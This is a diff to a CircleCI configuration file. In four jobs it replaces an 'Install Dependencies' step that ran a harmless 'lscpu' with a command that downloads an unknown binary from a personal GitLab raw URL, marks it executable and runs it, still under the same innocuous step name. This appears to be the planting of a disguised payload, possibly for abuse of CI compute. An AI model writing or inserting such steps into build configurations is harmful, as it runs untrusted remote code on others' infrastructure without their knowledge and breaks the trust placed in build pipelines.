@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
 workflows:
     version: 2.1
     build:
